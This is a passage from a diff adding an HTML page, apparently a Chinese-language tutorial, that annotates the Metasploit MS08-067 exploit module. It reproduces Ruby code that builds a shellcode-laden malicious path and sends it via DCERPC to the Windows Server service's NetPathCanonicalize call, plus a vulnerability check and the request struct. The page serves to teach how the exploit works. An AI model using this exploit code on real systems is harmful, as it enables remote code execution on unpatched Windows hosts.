+            jumper[<span style="color: #D0372D;">58</span>,<span style="color: #D0372D;">2</span>] = <span style="color: #008000;">"\xeb\x62"</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#29983;&#25104;&#24694;&#24847;&#36335;&#24452;&#32467;&#26500;&#65292;&#35814;&#32454;&#20449;&#24687;&#35265;&#27880;&#37322;</span>
+            path =
+                <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.to_unicode(<span style="color: #008000;">"\\"</span>) +
+                <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">This buffer is removed from the front</span>
+                <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.rand_text_alpha(<span style="color: #D0372D;">100</span>) +
+                <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Shellcode</span>
+                payload.encoded +
+                <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Relative path to trigger the bug</span>
+                <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.to_unicode(<span style="color: #008000;">"\\..\\..\\"</span>) +
+                <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Extra padding</span>
+                <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.to_unicode(pad) +
+                <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Writable memory location (static)</span>
+                [mytarget[<span style="color: #008000;">'Scratch'</span>]].pack(<span style="color: #008000;">"V"</span>) + <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">EBP</span>
+                <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Return to code which disables NX (or just the return)</span>
+                [ mytarget[<span style="color: #008000;">'DisableNX'</span>] || mytarget.ret ].pack(<span style="color: #008000;">"V"</span>) +
+                <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Padding with embedded jump</span>
+                jumper +
+                <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">NULL termination</span>
+                <span style="color: #008000;">"\x00"</span> * <span style="color: #D0372D;">2</span>
+        <span style="color: #0000FF;">end</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">...SNIP...</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#25226;&#26500;&#36896;&#30340;&#25968;&#25454;&#21457;&#36865;&#20986;&#21435;</span>
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#39318;&#20808;&#21521;SMB&#31471;&#21475;&#21457;&#36865;RPC&#35831;&#27714;</span>
+        handle = dcerpc_handle(
+            <span style="color: #008000;">'4b324fc8-1670-01d3-1278-5a47bf6ee188'</span>, <span style="color: #008000;">'3.0'</span>,
+            <span style="color: #008000;">'ncacn_np'</span>, [<span style="color: #008000;">"\\</span><span style="color: #BA36A5;">#{datastore['SMBPIPE']}</span><span style="color: #008000;">"</span>]
+        )
+        dcerpc_bind(handle)
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#26500;&#36896;&#23436;&#25972;&#30340;&#25968;&#25454;&#21253;</span>
+        stub =
+            <span style="color: #6434A3;">NDR</span>.uwstring(server) +
+            <span style="color: #6434A3;">NDR</span>.UnicodeConformantVaryingStringPreBuilt(path) +
+            <span style="color: #6434A3;">NDR</span>.long(<span style="color: #006FE0;">rand</span>(<span style="color: #D0372D;">1024</span>)) +
+            <span style="color: #6434A3;">NDR</span>.wstring(prefix) +
+            <span style="color: #6434A3;">NDR</span>.long(<span style="color: #D0372D;">4097</span>) +
+            <span style="color: #6434A3;">NDR</span>.long(<span style="color: #D0372D;">0</span>)
+        <span style="color: #8D8D84;"># </span><span style="color: #00ff00; font-weight: bold; font-style: italic;">NOTE:</span><span style="color: #8D8D84; font-style: italic;"> we don't bother waiting for a response here...</span>
+        print_status(<span style="color: #008000;">"Attempting to trigger the vulnerability..."</span>)
+<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">&#23558;stub&#20316;&#20026;&#20869;&#23481;&#35843;&#29992;&#36828;&#31243;&#20027;&#26426;&#30340;RPC&#25509;&#21475;</span>
+        dcerpc.call(0x1f, stub, <span style="color: #D0372D;">false</span>)
+        <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Cleanup</span>
+        handler
+        disconnect
+    <span style="color: #0000FF;">end</span>
+    <span style="color: #0000FF;">def</span> <span style="color: #006699;">check</span>
+        <span style="color: #0000FF;">begin</span>
+            connect()
+            smb_login()
+        <span style="color: #0000FF;">rescue</span> <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">ConnectionError</span> =&gt; e
+            print_error(<span style="color: #008000;">"Connection failed: </span><span style="color: #BA36A5;">#{e.class}</span><span style="color: #008000;">: </span><span style="color: #BA36A5;">#{e}</span><span style="color: #008000;">"</span>)
+            <span style="color: #0000FF;">return</span>
+        <span style="color: #0000FF;">end</span>
+        <span style="color: #8D8D84;">#</span>
+        <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Build the malicious path name</span>
+        <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">5b878ae7 "db @eax;g"</span>
+        prefix = <span style="color: #008000;">"\\"</span>
+        path =
+            <span style="color: #008000;">"\x00\\\x00/"</span>*0x10 +
+            <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.to_unicode(<span style="color: #008000;">"\\"</span>) +
+            <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.to_unicode(<span style="color: #008000;">"R7"</span>) +
+            <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.to_unicode(<span style="color: #008000;">"\\..\\..\\"</span>) +
+            <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.to_unicode(<span style="color: #008000;">"R7"</span>) +
+            <span style="color: #008000;">"\x00"</span>*<span style="color: #D0372D;">2</span>
+        server = <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Text</span>.rand_text_alpha(<span style="color: #006FE0;">rand</span>(<span style="color: #D0372D;">8</span>)+<span style="color: #D0372D;">1</span>).upcase
+        handle = dcerpc_handle( <span style="color: #008000;">'4b324fc8-1670-01d3-1278-5a47bf6ee188'</span>, <span style="color: #008000;">'3.0'</span>,
+            <span style="color: #008000;">'ncacn_np'</span>, [<span style="color: #008000;">"\\</span><span style="color: #BA36A5;">#{datastore['SMBPIPE']}</span><span style="color: #008000;">"</span>]
+        )
+        <span style="color: #0000FF;">begin</span>
+            <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Samba doesn't have this handle and returns an ErrorCode</span>
+            dcerpc_bind(handle)
+        <span style="color: #0000FF;">rescue</span> <span style="color: #6434A3;">Rex</span>::<span style="color: #6434A3;">Proto</span>::<span style="color: #6434A3;">SMB</span>::<span style="color: #6434A3;">Exceptions</span>::<span style="color: #6434A3;">ErrorCode</span>
+            <span style="color: #0000FF;">return</span> <span style="color: #6434A3;">Msf</span>::<span style="color: #6434A3;">Exploit</span>::<span style="color: #6434A3;">CheckCode</span>::<span style="color: #6434A3;">Safe</span>
+        <span style="color: #0000FF;">end</span>
+        print_status(<span style="color: #008000;">"Verifying vulnerable status... (path: 0x%08x)"</span> % path.length)
+        stub =
+            <span style="color: #6434A3;">NDR</span>.uwstring(server) +
+            <span style="color: #6434A3;">NDR</span>.UnicodeConformantVaryingStringPreBuilt(path) +
+            <span style="color: #6434A3;">NDR</span>.long(<span style="color: #D0372D;">8</span>) +
+            <span style="color: #6434A3;">NDR</span>.wstring(prefix) +
+            <span style="color: #6434A3;">NDR</span>.long(<span style="color: #D0372D;">4097</span>) +
+            <span style="color: #6434A3;">NDR</span>.long(<span style="color: #D0372D;">0</span>)
+        resp = dcerpc.call(0x1f, stub)
+        error = resp[<span style="color: #D0372D;">4</span>,<span style="color: #D0372D;">4</span>].unpack(<span style="color: #008000;">"V"</span>)[<span style="color: #D0372D;">0</span>]
+        <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">Cleanup</span>
+        simple.client.close
+        simple.client.tree_disconnect
+        disconnect
+        <span style="color: #0000FF;">if</span> (error == 0x0052005c) <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">\R :)</span>
+            <span style="color: #0000FF;">return</span> <span style="color: #6434A3;">Msf</span>::<span style="color: #6434A3;">Exploit</span>::<span style="color: #6434A3;">CheckCode</span>::<span style="color: #6434A3;">Vulnerable</span>
+        <span style="color: #0000FF;">else</span>
+            print_status(<span style="color: #008000;">"System is not vulnerable (status: 0x%08x)"</span> % error) <span style="color: #0000FF;">if</span> error
+            <span style="color: #0000FF;">return</span> <span style="color: #6434A3;">Msf</span>::<span style="color: #6434A3;">Exploit</span>::<span style="color: #6434A3;">CheckCode</span>::<span style="color: #6434A3;">Safe</span>
+        <span style="color: #0000FF;">end</span>
+    <span style="color: #0000FF;">end</span>
+<span style="color: #0000FF;">end</span>
+</pre>
+</div>
+
+<p>
+<b>stub</b> 是符合 NetPathCanonicalize 结构的标准调用包头，将触发远程主机上的 Server 服务去调用路径规范化处理函数 <b>NetpwPathCannonicalize，stub</b> 的 <b>srvsvc<sub>NetPathCanonicalize</sub></b> 结构体如下：
+</p>
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">srvsvc_NetPathCanonicalize</span> <span style="color: #707183;">{</span>
+    <span style="color: #0000FF;">struct</span> <span style="color: #7388D6;">{</span>
+        <span style="color: #0000FF;">const</span> <span style="color: #6434A3;">char</span> *<span style="color: #BA36A5;">server_unc</span>; <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">[unique, charset(UTF16)]</span>
+        <span style="color: #0000FF;">const</span> <span style="color: #6434A3;">char</span> *<span style="color: #BA36A5;">path</span>;       <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">[charset(UTF16)]</span>
+        <span style="color: #6434A3;">uint32_t</span> <span style="color: #BA36A5;">maxbuf</span>;
+        <span style="color: #0000FF;">const</span> <span style="color: #6434A3;">char</span> *<span style="color: #BA36A5;">prefix</span>;     <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">[charset(UTF16)]</span>
+        <span style="color: #6434A3;">uint32_t</span> <span style="color: #BA36A5;">pathflags</span>;
+        <span style="color: #6434A3;">uint32_t</span> *<span style="color: #BA36A5;">pathtype</span>;     <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">[ref]</span>
+    <span style="color: #7388D6;">}</span> <span style="color: #BA36A5;">in</span>;
+<span style="color: #707183;">}</span>;
+</pre>
+</div>
+
+<blockquote>
+<p>
+二进制分析见《Metasploit 渗透测试魔鬼训练营》P205-211。
+</p>
+</blockquote>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<a href="https://beian.miit.gov.cn" target="_blank">湘ICP证019014083号</a>
+</div>
+</body>
+</html>
